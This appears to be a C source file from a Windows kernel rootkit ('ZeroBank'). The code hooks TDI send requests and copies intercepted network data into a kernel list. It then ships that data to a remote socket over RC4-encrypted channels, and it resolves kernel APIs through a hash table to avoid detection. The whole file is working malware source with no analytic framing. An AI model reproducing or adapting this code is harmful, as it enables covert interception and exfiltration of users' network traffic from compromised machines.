#include "common.h"

PZEROBANK_SEND_HEAD g_send_head = NULL;

PZEROBANK_SEND_HEAD g_rk_get_total_send_request() {

	PZEROBANK_FILTER_SEND_REQUESTS pSendRequests = NULL;
	PCHAR Buffer = NULL;
	ULONG size = 0;
	PCHAR Alloc = NULL;

	Buffer = (CHAR*)MmGetSystemAddressForMdlSafe(g_pIrp->MdlAddress,NormalPagePriority);
	if (Buffer != NULL) {
		__try {

			pSendRequests = (PZEROBANK_FILTER_SEND_REQUESTS)g_Hash._ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_FILTER_SEND_REQUESTS));
			memset(pSendRequests, 0, sizeof(ZEROBANK_FILTER_SEND_REQUESTS));
		
			size = g_pStackLocation->Parameters.DeviceIoControl.OutputBufferLength;

			do
			{
				Alloc = (PCHAR)g_Hash._ExAllocatePool(NonPagedPool, (SIZE_T)size);
			
			} while (Alloc == NULL);

			memcpy(Alloc, Buffer, size);
			memcpy((PVOID)pSendRequests->SendBuffer, (PVOID)Alloc, (SIZE_T)size);

			DbgPrint("\n%s", pSendRequests->SendBuffer);

			g_Hash._KfAcquireSpinLock(&g_globalspinlock);
			InsertTailList(&g_send_head->Entry, &pSendRequests->Entry);
			g_Hash._KfReleaseSpinLock(&g_globalspinlock, Irql);

			g_send_head->NumberOfEntries++;

			g_Hash._ExFreePoolWithTag(Alloc, 0);

		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			return GetExceptionCode();
			KdPrint(("\r\nException Caught in TDI_SEND filter requests"));
		}
	}

	return g_send_head->NumberOfEntries;
}

ULONG g_rk_copy_sendlist_to_buffer(IN PZEROBANK_FILTER_SEND_REQUESTS pBuffer, IN PROOTKIT_API_HASH Hash) {
	PZEROBANK_FILTER_SEND_REQUESTS pSend = NULL;
	ULONG neededsize = 0;

	if (g_send_head == NULL)
		return 1;

	Hash->_KfAcquireSpinLock(&g_globalspinlock);

	while (!IsListEmpty(&g_send_head->Entry)) {
		pSend = (PZEROBANK_FILTER_SEND_REQUESTS)RemoveTailList(&g_send_head->Entry);
		memcpy(pBuffer, pSend, sizeof(ZEROBANK_FILTER_SEND_REQUESTS));
		Hash->_ExFreePoolWithTag(pSend, 0);
		pBuffer++;
		neededsize++;

	}

	Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);

	Hash->_ExFreePoolWithTag(g_send_head, 0);
	g_send_head = NULL;

	return neededsize*sizeof(ZEROBANK_FILTER_SEND_REQUESTS);

}

BOOLEAN g_rk_sendrequests_to_userspace(IN PFILE_OBJECT pSocket, IN PROOTKIT_API_HASH Hash) {
	BOOLEAN g_cond = FALSE;
	ULONG bytes = 0;
	PZEROBANK_FILTER_SEND_REQUESTS pSend = NULL;
	PVOID Alloc = NULL;
	PMDL Mdl = NULL;
	INT sendsize = 0;
	INT returnedbytes = 0;


	bytes = g_send_head->NumberOfEntries*sizeof(ZEROBANK_FILTER_SEND_REQUESTS);
	if (bytes == 0)
		return FALSE;

	do
	{
		sendsize = send(pSocket, (PCHAR)&bytes, sizeof(ULONG));
		if (sendsize > 0)
		{
			Alloc = KiAllocateMappedVirtualMemory(bytes, 'kbot', &Mdl, Hash);
			if (Alloc && Hash->_MmIsAddressValid(Alloc) && KiIsMdlAdddressValid(Mdl, Hash) == TRUE)
			{
				pSend = (PZEROBANK_FILTER_SEND_REQUESTS)Alloc;
				if (pSend && Hash->_MmIsAddressValid(pSend))
				{
					returnedbytes = g_rk_copy_sendlist_to_buffer(pSend, Hash);
					if (returnedbytes > 0)
					{
						sendsize = tdi_send_crypted(pSocket, RC4_KEY_2,(PVOID)pSend, returnedbytes, 0);
						if (sendsize > 0)
						{
							g_cond = TRUE;
						}
					}
				}
			}
		}

	} while (FALSE);

	KiFreeMappedVirtualMemory(Alloc, 'kbot', Mdl, Hash);
	Alloc = NULL;

	return g_cond;
}